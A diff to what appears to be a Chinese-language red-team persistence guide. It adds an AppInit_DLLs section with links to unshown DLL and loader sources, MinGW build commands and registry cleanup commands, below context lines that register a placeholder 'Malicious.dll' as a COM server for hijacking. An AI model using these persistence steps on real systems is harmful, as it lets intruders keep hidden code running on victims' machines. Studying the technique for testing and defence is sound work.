@@ -902,3 +902,22 @@ x86_64-w64-mingw32-g++ -O2 com_dll.cpp -o com_dll.exe -I /usr/share/mingw-w64/in
 Set-ItemProperty -Path "HKCR:\CLSID\{CLSID}\InprocServer32" -Name "(default)" -Value "C:\Path\To\Malicious.dll"
 reg delete "HKCU\Software\Classes\CLSID\{CLSID}" /f
 ```
+
+### AppInit_DLLs
+
+[AppInit_DLLs.wolf.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/AppInit_DLLs.wolf.cpp)
+
+```Bash
+x86_64-w64-mingw32-gcc -shared -o wolf.dll wolf.cpp -fpermissive
+```
+
+[AppInit.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E4%BA%94%E7%AB%A0/Per/AppInit.cpp)
+
+```Bash
+x86_64-w64-mingw32-g++ -O2 AppInit.cpp -o AppInit.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+```powershell
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /d 0
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /f
+```
